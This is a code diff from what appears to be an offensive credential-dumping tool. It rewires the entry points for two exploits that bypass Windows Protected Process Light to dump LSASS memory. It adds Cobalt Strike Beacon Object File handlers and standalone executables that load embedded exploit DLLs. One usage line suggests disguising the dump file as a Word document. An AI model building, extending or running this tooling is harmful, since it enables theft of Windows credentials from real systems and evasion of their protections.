@@ -1,34 +1,51 @@
 #include "ppl/ppl.h"
-#include "ppl/ppl_dump.h"
-#include "ppl/ppl_medic.h"
 
-#ifdef BOF
+#if defined(PPL_DUMP) && defined(BOF)
+
+#include "ppl_dump.c"
+#include "ppl_utils.c"
+#include "../utils.c"
+#include "../dinvoke.c"
+#include "../syscalls.c"
+#include "../token_priv.c"
+#include "../impersonate.c"
 
 void go(char* args, int length)
 {
-    datap          parser               = { 0 };
-    BOOL           duplicate_handle     = FALSE;
-    LPCSTR         dump_path            = NULL;
-    BOOL           use_valid_sig        = FALSE;
+    datap          parser                    = { 0 };
+    BOOL           duplicate_handle          = FALSE;
+    LPCSTR         dump_path                 = NULL;
+    BOOL           use_valid_sig             = FALSE;
+    unsigned char* nanodump_ppl_dump_dll     = NULL;
+    int            nanodump_ppl_dump_dll_len = 0;
 
     BeaconDataParse(&parser, args, length);
     dump_path = BeaconDataExtract(&parser, NULL);
     use_valid_sig = (BOOL)BeaconDataInt(&parser);
     duplicate_handle = (BOOL)BeaconDataInt(&parser);
+    nanodump_ppl_dump_dll = (unsigned char*)BeaconDataExtract(&parser, &nanodump_ppl_dump_dll_len);
 
     run_ppl_dump_exploit(
+        nanodump_ppl_dump_dll,
+        nanodump_ppl_dump_dll_len,
         dump_path,
         use_valid_sig,
         duplicate_handle);
 }
 
-#endif
+#elif defined(PPL_DUMP) && defined(EXE)
 
-#ifdef EXE
+#include "ppl/ppl_dump.h"
+
+#ifdef _WIN64
+ #include "nanodump_ppl_dump_dll.x64.h"
+#else
+ #include "nanodump_ppl_dump_dll.x86.h"
+#endif
 
 void usage(char* procname)
 {
-    PRINT("usage: %s [--ppldump|--pplmedic] --write C:\\Windows\\Temp\\doc.docx [--valid] [--duplicate] [--help]", procname);
+    PRINT("usage: %s --write C:\\Windows\\Temp\\doc.docx [--valid] [--duplicate] [--help]", procname);
     PRINT("Dumpfile options:");
     PRINT("    --write DUMP_PATH, -w DUMP_PATH");
     PRINT("            filename of the dump");
@@ -47,8 +64,6 @@ int main(int argc, char* argv[])
     BOOL   duplicate_handle = FALSE;
     LPCSTR dump_path        = NULL;
     BOOL   use_valid_sig    = FALSE;
-    BOOL   use_ppldump      = FALSE;
-    BOOL   use_pplmedic     = FALSE;
 
 #ifdef _M_IX86
     if(local_is_wow64())
@@ -60,15 +75,7 @@ int main(int argc, char* argv[])
 
     for (int i = 1; i < argc; ++i)
     {
-        if (!strncmp(argv[i], "--ppldump", 10))
-        {
-            use_ppldump = TRUE;
-        }
-        else if (!strncmp(argv[i], "--pplmedic", 11))
-        {
-            use_pplmedic = TRUE;
-        }
-        else if (!strncmp(argv[i], "-v", 3) ||
+        if (!strncmp(argv[i], "-v", 3) ||
             !strncmp(argv[i], "--valid", 8))
         {
             use_valid_sig = TRUE;
@@ -101,18 +108,6 @@ int main(int argc, char* argv[])
         }
     }
 
-    if ( use_ppldump && use_pplmedic )
-    {
-        PRINT("You can't provide both --ppldump and --pplmedic");
-        return 0;
-    }
-
-    if ( !use_ppldump && !use_pplmedic )
-    {
-        PRINT("You must provide either --ppldump or --pplmedic");
-        return 0;
-    }
-
     if (!dump_path)
     {
         PRINT("You need to provide the --write parameter");
@@ -125,20 +120,61 @@ int main(int argc, char* argv[])
         return 0;
     }
 
-    if ( use_ppldump )
+    run_ppl_dump_exploit(
+        nanodump_ppl_dump_dll,
+        nanodump_ppl_dump_dll_len,
+        dump_path,
+        use_valid_sig,
+        duplicate_handle);
+
+    return 0;
+}
+
+#elif defined(PPL_MEDIC) && defined(BOF)
+
+#include "ppl_medic.c"
+#include "ppl_medic_client.c"
+#include "ppl_utils.c"
+#include "../handle.c"
+#include "../utils.c"
+#include "../dinvoke.c"
+#include "../syscalls.c"
+#include "../token_priv.c"
+#include "../impersonate.c"
+
+void go(char* args, int length)
+{
+    datap          parser                     = { 0 };
+    unsigned char* nanodump_ppl_medic_dll     = NULL;
+    int            nanodump_ppl_medic_dll_len = 0;
+
+    BeaconDataParse(&parser, args, length);
+    nanodump_ppl_medic_dll = (unsigned char*)BeaconDataExtract(&parser, &nanodump_ppl_medic_dll_len);
+
+    run_ppl_medic_exploit(
+        nanodump_ppl_medic_dll,
+        nanodump_ppl_medic_dll_len);
+}
+
+#elif defined(PPL_MEDIC) && defined(EXE)
+
+#include "ppl/ppl_medic.h"
+
+#include "nanodump_ppl_medic_dll.x64.h"
+
+int main(int argc, char* argv[])
+{
+    if (argc > 1)
     {
-        run_ppl_dump_exploit(
-            dump_path,
-            use_valid_sig,
-            duplicate_handle);
+        PRINT("This binary doesn't take any parameteres because all the 'dump options' are hardcoded in NanoDumpPPLMedic");
+        PRINT("The idea here is to avoid the interaction between processes as much as possible");
+        PRINT("Modify the first lines of NanoDumpPPLMedic in order to customize how LSASS is dumped");
+        return 0;
     }
-    else if ( use_pplmedic )
-    {
-        run_ppl_medic_exploit(
-            dump_path,
-            use_valid_sig,
-            duplicate_handle);
-    }
+
+    run_ppl_medic_exploit(
+        nanodump_ppl_medic_dll,
+        nanodump_ppl_medic_dll_len);
 
     return 0;
 }
